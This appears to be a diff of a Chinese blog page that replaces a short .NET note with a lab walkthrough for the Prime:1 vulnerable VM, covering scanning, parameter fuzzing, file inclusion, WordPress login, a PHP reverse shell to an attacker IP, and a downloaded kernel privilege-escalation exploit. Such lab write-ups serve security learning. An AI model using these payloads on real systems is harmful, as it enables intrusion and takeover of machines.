@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>开发语言 |  小张之栈</title>
+      <title>Prime:1 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-开发语言"
+  id="post-prime1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  开发语言
+  Prime:1
 </h1>
  
 
@@ -84,11 +84,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/10/08/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" class="article-date">
-  <time datetime="2023-10-08T13:25:25.000Z" itemprop="datePublished">2023-10-08</time>
+      <a href="/2023/09/17/prime1/" class="article-date">
+  <time datetime="2023-09-17T05:21:20.000Z" itemprop="datePublished">2023-09-17</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/VPN/">VPN</a>
+    <a class="article-category-link" href="/categories/vulhub/">vulhub</a>
   </div>
   
 <div class="word_count">
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">83</span>
+            <span class="post-count">1.1k</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">4 分钟</span>
         </span>
     </span>
 </div>
@@ -120,11 +120,93 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h1><p><strong>DLL文件反编译指向</strong></p>
-<p>一般代码在dll文件中，它的内容只有<code>inherits=被调用的类</code>拖到专门的分析工具中进行分析</p>
-<p><strong>web.config调试错误</strong></p>
-<p>有一个customError，mode属性为off时，当url尝试sql注入时，会有报错原因。</p>
-<p>on就是可以自定义报错信息</p>
+  <h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -p- 192.168.1.4 <span class="comment">#22,80</span></span><br><span class="line">sudo nmap -sT -Pn -p22,80 -sV -sC -O 192.168.1.4 </span><br><span class="line">sudo nmap --script=vuln -p22,80 192.168.1.4 </span><br></pre></td></tr></table></figure>
+
+<p>80端口就一个图片页面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.4 -X ,.html,.php</span><br></pre></td></tr></table></figure>
+
+<p>有一个wordpress路径</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128150037524.png" alt="wordpress首页"></p>
+<p>去admin.php文件，万能密码尝试一下，不行</p>
+<p>忘记密码部分，获取账号信息，admin&#x2F;root是不存在的</p>
+<p>那既然插件得到wordpress版本5.2.2，终端去searchsploit一下，还是有几个漏洞的，先不急</p>
+<p>根据扫到的路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/uploads/2019/08/ <span class="comment">#这是上传文件地址，没文件</span></span><br><span class="line">http://192.168.1.4/wordpress/wp-admin/maint/ <span class="comment">#有个repair文件，没用</span></span><br><span class="line">http://192.168.1.4/wordpress/wp-admin/includes/ <span class="comment">#有很多文件，但是没什么权限看</span></span><br><span class="line">http://192.168.1.4/wordpress/wp-includes/ <span class="comment">#也有很多文件，打开都是空白的</span></span><br><span class="line">http://192.168.1.4/wordpress/?static=1 <span class="comment">#这个是百度搜的，确实可以未授权看到一些文章，但意义不大</span></span><br></pre></td></tr></table></figure>
+
+<p>好好好，我就知道，我少扫了个txt的扩展</p>
+<p>提示说fuzz参数</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128162418719.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster fuzz -u  http://192.168.1.4/index.php?FUZZ=1 -w /tmp/fuzz.txt <span class="comment">#尝试了好几个php文件没有结果</span></span><br></pre></td></tr></table></figure>
+
+<p>看了wp，还是找的php文件不对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo wfuzz -w /tmp/fuzz.txt -u http://192.168.1.4/index.php?FUZZ=1 --hh 136</span><br><span class="line"><span class="comment">#因为出现的字节数为136的太多了，所以可以隐藏不显示，只需要关注特殊的字节数的即可</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="二、文件包含"><a href="#二、文件包含" class="headerlink" title="二、文件包含"></a>二、文件包含</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128205338958.png" alt="出现了个file"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128205437163.png"></p>
+<p>想到前面提到的<strong>location.txt</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128205631924.png"></p>
+<p>其他php，想到同为根目录下的image.php文件</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128205838546.png"></p>
+<p>说明现在根目录，那我直接找其它敏感路径了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128212053546.png" alt="这个像个提示"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4/image.php?secrettier360=/home/saket/password.txt <span class="comment">#follow_the_ippsec </span></span><br></pre></td></tr></table></figure>
+
+<p>ssh尝试一下，不是密码</p>
+<p>这个肯定是密码，但不是ssh的密码，那么想到还有后台登录</p>
+<p>忘记密码测试一波账号：saket，没有这个账号，那么post的发布者 <code>victor</code>是有的，想到试一下账号和获得的密码</p>
+<h1 id="三、登录后台"><a href="#三、登录后台" class="headerlink" title="三、登录后台"></a>三、登录后台</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128213057000.png"></p>
+<p>找到创建新页面的地方，编辑，code</p>
+<p>发现没有代码形式，比如php，想到安装</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128213431447.png"></p>
+<p>看下插件部分</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128213754327.png"></p>
+<p>好好好，本地安装不了</p>
+<p><img src="/../../../Typora/img111/image-20231128213841452.png"></p>
+<p>这个要ftp凭证或者主机名，嘶</p>
+<p>先不急，看看其它拿shell的地方，有个文件上传的地方，可以改后缀也被识别，算了</p>
+<p>尝试了一波web后台登录凭证，也不行，它的上传Plugin，也不行，。父目录不可写</p>
+<p>然后是Apperance部分，上传主题Theme，也不可写，好好好</p>
+<p>看了wp，在<strong>Theme Editor</strong>里有一个可写的php文件</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128223055583.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.109/7777 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#攻击机监听</span></span><br></pre></td></tr></table></figure>
+
+<p>嘶，这个文件路径在哪里</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen</span><br><span class="line"><span class="comment">#改一下</span></span><br><span class="line">http://192.168.1.4/wordpress/wp-content/themes/twentynineteen/secret.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231128224000030.png"></p>
+<h1 id="四、内核提权"><a href="#四、内核提权" class="headerlink" title="四、内核提权"></a>四、内核提权</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231128224025255.png"></p>
+<p>在指定文件文件下是可以免密root执行的，但是呢，无法修改这文件，所以只能放弃</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#ubuntu 4.10.0-28-generic </span></span><br><span class="line">searchsploit Linux ubuntu 4.10.0-28</span><br><span class="line">searchsploit -m 45010.c <span class="comment">#下载</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231129104631476.png"></p>
+<p>是一个c语言文件，下载后，cat一下</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231129105038371.png"></p>
+<p>这个先编译后再使用，但因为编译环境因机器而异，一般先上传到靶机，去编译，没有gcc，再考虑将编译后的传过去</p>
+<h2 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h2><p>攻击机搭建服务器，php和python都可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:80</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个注意的点：</p>
+<blockquote>
+<p>在低权限的文件夹下进行搭建，比如tmp，靶机也在tmp路径下去下载</p>
+</blockquote>
+<p>然后在靶机的webshell中下载c文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.186.1.109:80/45010.c</span><br></pre></td></tr></table></figure>
+
+<h2 id="拿到root"><a href="#拿到root" class="headerlink" title="拿到root"></a>拿到root</h2><p>编译后执行即可</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231129110123934.png"></p>
+<p>webshell里也有一个user.txt，flag，不用看了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>80和22端口，走80端口</li>
+<li>路径扫一波，发现dev文件，给出提示去Fuzz</li>
+<li>对php文件fuzz参数得到，file&#x3D;location.txt</li>
+<li>进而去另一个php文件包含得到了<strong>password</strong></li>
+<li>尝试ssh，不对</li>
+<li>去webpress首页，得到一个作者名为victor，考虑作为<strong>username</strong></li>
+<li>去后台登录，找文件上传、内嵌反弹shell的点</li>
+<li>反弹shell，提权尝试-&gt;内核提权</li>
+</ol>
+<p>这对实战也是有帮助的，有的时候一个网页可能需要接收一些参数，页面内容和不接收参数的是不同的；所以尽可能去fuzz一些参数，从而获得敏感信息</p>
+<p>进而拿到了后台凭证，去后台反弹shell即可</p>
  
       <!-- reward -->
       
@@ -189,12 +271,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/10/08/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/17/prime1/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPN/" rel="tag">VPN</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulhub/" rel="tag">vulhub</a></li></ul>
 
     </footer>
   </div>
@@ -202,19 +284,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/10/12/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81/" class="article-nav-link">
+      <a href="/2023/09/17/Lamp2/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            加密编码
+            LAMPSECURITY:CTF7
           
         </div>
       </a>
     
     
-      <a href="/2023/10/08/Digdong/" class="article-nav-link">
+      <a href="/2023/09/16/Lamp1/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Digdong</div>
+        <div class="article-nav-title">LAMPSECURITY:CTF4</div>
       </a>
     
   </nav>
